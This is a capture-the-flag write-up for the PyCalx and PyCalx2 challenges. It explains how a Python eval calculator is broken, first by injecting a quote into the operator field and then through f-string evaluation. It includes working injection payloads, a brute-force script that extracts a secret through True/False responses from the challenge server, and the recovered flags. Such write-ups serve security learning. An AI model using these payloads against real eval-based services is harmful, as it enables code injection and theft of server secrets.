# PyCalx(2) &ndash; write-up by @AltairQ
>Keywords: python, python3.6, f-strings, whitelisting, eval, web

Included files:
* `server.py` - original server-side code
* `main.py` - stripped server code for local testing
* `hax.py` - automated exploit for PyCalx
* `hax2.py` - automated exploit for PyCalx2
* `hax2bs.py` - second exploit rewritten with binary search

## Task Description
> This code is supposed to be unexploitable :/ another pyjail? <br>
> [Source]  <br>
> Try this or this  <br>
> (link: http://178.128.96.203/cgi-bin/server.py?value1=abc&op=%3D%3D&value2=abc) <br>
> Notice: The flag may contain non alphabetic characters (but still printable) <br>


## A quick look at PyCalx
Accessing the attached links shows us a simple webpage with three text inputs and a button. We can access the server-side code by providing `source=1` as a GET parameter.

Attacker-controlled GET variables are `value1`, `value2`, `op` and of course `source`. All but the last one are filtered using some kind of a filter. `get_value(val)` blacklists any of these characters: `()[]'"`. `op` uses a different function, `get_op(val)` which whitelists the first character of `op` to be one of these: `+,-,/,*,=,!`. Also, `op` is limited to 2 characters, `value1/2` are limited to 64 chacters, and none of the `value` and `op` variables can be empty.

Server-side code firstly validates both of the `value` variables and, if it's a string, wraps it in single quotes (using `repr(...)` on a `str`). They must be of the same type (intness is validated using `.isdigit()`). Then the `value`s get concatenated with `op` in between and `eval`ed. The result of `eval` is printed only if it consists of digits or is equal to either `'True'` or `'False'`. Any exceptions are caught and result in `Invalid` being printed out.

Our objective is to discover the contents of the global variable `FLAG`:
```python
FLAG = open('/var/www/flag','r').read()
```

## The vulnerability

Pretty obvious to find, arises from two code fragments:
```python
        # in get_op(val)
        list_ops = ['+','-','/','*','=','!']
        if val == '' or val[0] not in list_ops:
            print('<center>Invalid op</center>')
```
and
```python
    calc_eval = str(repr(value1)) + str(op) + str(repr(value2))
```

We have complete control of the second character of `op`, and additionally it's not wrapped using `repr`. First we try to escape the string context by closing one of the single quotes. Test payload:
```python
value1 = " "
op = "+'"
value2 = "+ FLAG #" # comment symbol to remove the single quote at the end
```
would be evaluated as
```python
eval("' '+''+FLAG #'")
```
Unfortunately the whitelist at the end will not let us just print the `FLAG`. We have to be smarter than this, and limit our payload results to only logic values.

## The exploit
We can leverage the lexicographical comparison of strings in python (using non-blacklisted `<` operator) to brute-force the flag. `a` is "less" than `b` if `a` is a prefix of `b` or if the first different character in `a` is "lower" (in the `ord(...)` sense) than the correspoding character of `b`. This means we can brute-force each character independently, reducing the complexity from multiplicative to additive. Brute forcing one character costs us at most `|alphabet|` tries - using binary search, we can achieve `log_2|alphabet|`.

The automated payload looks like this:
```python
cguess = "MeePwn{"
op = "+'"
val2 = "+ < FLAG #"


while True:
    print(cguess)

    for c in alphabet:
        cchar = c

        print(c, end=" ", flush=True)

        params = {
            'value1': cguess+cchar,
            'op': op,
            'value2': val2
        }

        time.sleep(0.1)

        r = requests.get(url = "http://178.128.96.203/cgi-bin/server.py", params = params )

        # print(r.text)

        if "True" not in r.text:
            cguess += alphabet[alphabet.index(cchar)-1]
            print("got: " + cguess)
            break
```
The dissapointment comes after quite a chunk of the `FLAG` gets recovered - `MeePwnCTF{python3.66666666666666_` seems to be the most our code can achieve, and malfunctions after next guessed character. This is caused by the fact that the `FLAG` itself contains blacklisted characters, which we cannot include in `value2` vector.

## Back to the drawing board
We struggled quite a bit with this, we tried various encoding techniques, including using `# coding=...` trick, but none seemed to work. We failed to use the `source` variable, contents of which are fully under our control. Rewriting the code to use the `source` we recover the flag: `MeePwnCTF{python3.66666666666666_([_((you_passed_this?]]]]]])}`.

## PyCalx2 exploit
Only difference is the additional filtering of the `op` variable:
```python
op = get_op(get_value(arguments['op'].value))
```
The single quote approach will no longer work, but the previous flag contains a clue - the new feature of python3.6, the f-strings. In short, string literals prefixed with `f` will be parsed for expressions of the form `{...}` and evaluated. This allows for more concise string formatting:
```python
f"My name is {name}"
# vs
"My name is {}".format(name)
```
Using this information we can devise another exploit; by setting `op` to `+f` we can force the `value2` to be parsed as a f-string and escape the string context. Only problem is that we are forced to return a string. This can be cleverly mitigated by this exploit:
```python
value1 = 'T'
op = '+f'
value2 = 'ru{source>=FLAG or 101:c}'
```
If the `source>=FLAG` expression evaluates to `False`, the result will be `{101:c}`(=`'e'`) plus the rest of the string, in total `True` . Otherwise we will get an `Invalid` result. Using this we can once again brute-force the flag using a binary search, which yields the final answer: `MeePwnCTF{python3.6[_strikes_backkkkkkkkkkkk)}`.

[index.php]:<./index.php>
